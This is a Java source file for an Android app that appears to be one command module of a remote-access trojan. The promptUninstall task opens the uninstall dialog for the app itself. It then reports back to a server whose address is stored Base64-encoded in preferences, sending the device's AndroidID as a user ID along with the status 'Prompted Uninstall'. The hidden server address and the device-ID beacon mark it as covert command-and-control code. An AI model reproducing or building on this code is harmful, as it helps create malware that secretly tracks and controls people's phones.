package com.asynctask;

import android.content.Intent;
import android.net.Uri;
import android.os.AsyncTask;
import android.preference.PreferenceManager;
import android.util.Base64;

import com.connect.MyApplication;
import com.utils.CommonUtils;

import java.io.UnsupportedEncodingException;

/**
 * Created by Conan0xff on 2017/12/5.
 */

public class promptUninstall extends AsyncTask<String, Void, String> {
    @Override
    protected String doInBackground(String... params) {
        Intent intent = new Intent(Intent.ACTION_DELETE);
        intent.setData(Uri.parse("package:" + MyApplication.getContext().getPackageName()));
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        MyApplication.getContext().startActivity(intent);

        return "Executed";
    }

    @Override
    protected void onPostExecute(String result) {
        try {
            String URL = new String(Base64.decode(PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("URL", ""), Base64.DEFAULT));
            CommonUtils.getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("AndroidID", "") + "&Data=", "Prompted Uninstall");
        } catch (UnsupportedEncodingException e) {

            e.printStackTrace();
        }
    }

    @Override
    protected void onPreExecute() {/*httpcallexecuting*/}

    @Override
    protected void onProgressUpdate(Void... values) {
    }
}
